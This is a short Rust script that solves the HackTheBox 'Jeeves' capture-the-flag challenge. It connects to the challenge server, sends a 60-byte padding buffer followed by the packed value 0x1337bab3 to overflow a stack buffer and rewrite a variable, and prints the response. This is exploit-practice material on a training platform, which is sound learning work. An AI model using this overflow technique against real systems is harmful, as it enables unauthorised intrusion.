extern crate pwntools_rs;
use pwntools_rs::tubes::remote::Remote;
use pwntools_rs::tubes::tube::Tube;
use pwntools_rs::util::packing::p64;

// Solving https://app.hackthebox.eu/challenges/Jeeves.
// A simple buffer overflow and stack variable rewrite.

fn main() {
    let mut sock = Remote::remote("138.68.189.41", 30449);
    sock.clean(None);
    let mut buf = b"A".repeat(60);
    buf.append(&mut p64(0x1337bab3).unwrap());
    sock.sendline(buf);
    sock.recvuntil(b": ");
    print!("{}", std::str::from_utf8(&sock.recvline()).unwrap());
}
